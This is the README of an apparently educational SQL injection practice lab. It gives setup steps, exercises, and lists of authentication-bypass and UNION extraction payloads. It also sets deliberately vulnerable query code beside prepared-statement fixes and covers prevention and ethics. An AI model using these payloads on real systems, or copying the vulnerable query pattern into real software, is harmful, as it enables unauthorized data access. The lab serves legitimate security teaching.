# SQL Injection Practice Environment

## ⚠️ **IMPORTANT DISCLAIMER**
This project contains **deliberately vulnerable code** for educational purposes only. 
**NEVER use this code in production environments!**

## 📚 **Learning Objectives**
- Understand how SQL injection vulnerabilities work
- Practice identifying and exploiting SQL injection flaws
- Learn the difference between vulnerable and secure code
- Understand proper security measures and prevention techniques

## 🔓 **Vulnerable Files (For Practice)**
- **`vulnerable_login.php`** - Login page with SQL injection vulnerabilities
- **`VulnerableUserAuth.php`** - Authentication class with intentional security flaws
- **`vulnerable_dashboard.php`** - Dashboard showing successful exploitation

## 🔒 **Secure Files (Reference)**
- **`login.php`** - Secure login implementation
- **`UserAuth.php`** - Secure authentication class
- **`dashboard.php`** - Secure dashboard

## 🎯 **SQL Injection Exercises**

### **Exercise 1: Authentication Bypass**
**Target:** `vulnerable_login.php`

**Objective:** Bypass login without valid credentials

**Try these payloads in the email field:**
```sql
admin@example.com' OR '1'='1
' OR 1=1 --
' OR 'a'='a
admin@example.com' --
```

**How it works:**
- The vulnerable query: `SELECT * FROM users WHERE email = '$email' AND password = '$password'`
- With injection: `SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1' AND password = 'anything'`
- Since `'1'='1'` is always true, the query returns results without valid credentials

### **Exercise 2: Data Extraction**
**Target:** Search functionality in `vulnerable_login.php`

**Objective:** Extract sensitive data from the database

**Try these payloads in the search field:**
```sql
' OR 1=1 --
test' UNION SELECT username,password FROM users --
' UNION SELECT database(),version() --
' UNION SELECT table_name,column_name FROM information_schema.columns --
```

**What you'll learn:**
- How UNION attacks work
- Database structure enumeration
- Password extraction techniques

### **Exercise 3: Advanced Techniques**
**Explore these concepts:**

1. **Boolean-based Blind SQL Injection**
2. **Time-based Blind SQL Injection**
3. **Error-based SQL Injection**
4. **Second-order SQL Injection**

## 🛡️ **Security Comparison**

### **Vulnerable Code Example:**
```php
// DANGEROUS - Never do this!
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = $pdo->query($query);
```

### **Secure Code Example:**
```php
// SAFE - Always use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->execute([$email, $hashedPassword]);
$result = $stmt->fetch();
```

## 🔧 **Setup Instructions**

### **Prerequisites**
- XAMPP (or similar LAMP/WAMP stack)
- Web browser
- Basic understanding of SQL and PHP

### **Installation**
1. Copy all files to your web server directory (e.g., `C:\xampp\htdocs\sql_injection_practice\`)
2. Start Apache and MySQL services
3. Create the database by running `database.sql`
4. Access the vulnerable version at: `http://localhost/sql_injection_practice/vulnerable_login.php`
5. Access the secure version at: `http://localhost/sql_injection_practice/login.php`

### **Database Setup**
```sql
CREATE DATABASE user_auth;
USE user_auth;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    is_active BOOLEAN DEFAULT TRUE
);

-- Test user (password: password123)
INSERT INTO users (username, email, password) VALUES 
('testuser', 'test@example.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi');
```

## 🎓 **Learning Path**

### **Beginner Level**
1. Start with basic authentication bypass
2. Try different OR-based injections
3. Understand how the queries are modified
4. Compare with secure implementation

### **Intermediate Level**
1. Practice UNION-based attacks
2. Extract user data from database
3. Enumerate database structure
4. Understand different SQL injection types

### **Advanced Level**
1. Explore blind SQL injection techniques
2. Practice error-based attacks
3. Learn about SQL injection prevention
4. Study real-world case studies

## 🚨 **Common SQL Injection Payloads**

### **Authentication Bypass**
```sql
admin' --
admin' #
admin'/*
' OR 1=1 --
' OR 1=1 #
' OR 1=1/*
') OR '1'='1 --
') OR ('1'='1 --
```

### **UNION Attacks**
```sql
' UNION SELECT 1,2,3 --
' UNION SELECT null,username,password FROM users --
' UNION SELECT database(),user(),version() --
```

### **Information Gathering**
```sql
' AND 1=0 UNION SELECT null,table_name FROM information_schema.tables --
' AND 1=0 UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users' --
```

## 🛡️ **Prevention Techniques**

### **1. Prepared Statements (Recommended)**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
```

### **2. Stored Procedures**
```sql
DELIMITER $$
CREATE PROCEDURE GetUser(IN user_email VARCHAR(100))
BEGIN
    SELECT * FROM users WHERE email = user_email;
END$$
DELIMITER ;
```

### **3. Input Validation**
```php
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)));
}
```

### **4. Escaping (Less Secure)**
```php
$email = mysqli_real_escape_string($connection, $email);
```

### **5. Whitelist Validation**
```php
$allowedSortColumns = ['id', 'username', 'email', 'created_at'];
if (!in_array($sortColumn, $allowedSortColumns)) {
    throw new Exception('Invalid sort column');
}
```

## 📊 **Detection and Monitoring**

### **Signs of SQL Injection Attacks**
- Unusual database errors in logs
- Unexpected query patterns
- Failed authentication attempts with SQL syntax
- Database queries taking unusually long time
- Unauthorized data access patterns

### **Monitoring Tools**
- Web Application Firewalls (WAF)
- Database activity monitoring
- Log analysis tools
- Intrusion detection systems

## 🔗 **Additional Resources**

### **Online Learning Platforms**
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)

### **Documentation**
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PHP Manual - Prepared Statements](https://www.php.net/manual/en/pdo.prepared-statements.php)
- [MySQL Security Guidelines](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html)

### **Books**
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "SQL Injection Attacks and Defense" by Justin Clarke
- "Web Security Testing Cookbook" by Paco Hope

## ⚖️ **Legal and Ethical Considerations**

### **🚨 IMPORTANT REMINDERS:**
- **Only practice on your own systems or designated learning environments**
- **Never attempt SQL injection on systems you don't own**
- **Unauthorized testing is illegal and unethical**
- **Use this knowledge to build more secure applications**
- **Always obtain proper authorization before security testing**

### **Responsible Disclosure**
If you discover vulnerabilities in real systems:
1. Report to the organization responsibly
2. Allow reasonable time for fixes
3. Don't exploit vulnerabilities maliciously
4. Consider bug bounty programs

## 🎯 **Assessment Questions**

Test your understanding:

1. **What makes a SQL query vulnerable to injection?**
2. **Why do prepared statements prevent SQL injection?**
3. **What's the difference between UNION-based and Boolean-based SQL injection?**
4. **How can input validation help prevent SQL injection?**
5. **What are the limitations of escaping functions?**

## 📝 **Exercise Answers**

### **Exercise 1 Answer:**
The payload `' OR '1'='1` works because it changes the query logic:
```sql
-- Original: WHERE email = '$email' AND password = '$password'
-- Becomes: WHERE email = '' OR '1'='1' AND password = 'anything'
```
Since `'1'='1'` is always true, the condition passes.

### **Exercise 2 Answer:**
UNION attacks work by combining results from multiple SELECT statements:
```sql
-- Original: SELECT username,email FROM users WHERE username LIKE '%search%'
-- Injected: SELECT username,email FROM users WHERE username LIKE '%' UNION SELECT username,password FROM users --%'
```

## 🏆 **Completion Certificate**
After completing all exercises and understanding the concepts, you'll have:
- ✅ Understanding of SQL injection vulnerabilities
- ✅ Knowledge of different attack types
- ✅ Ability to identify vulnerable code
- ✅ Skills to implement secure coding practices
- ✅ Awareness of detection and prevention methods

---

**Remember: The goal is to learn how to build secure applications, not to cause harm. Use this knowledge responsibly!**
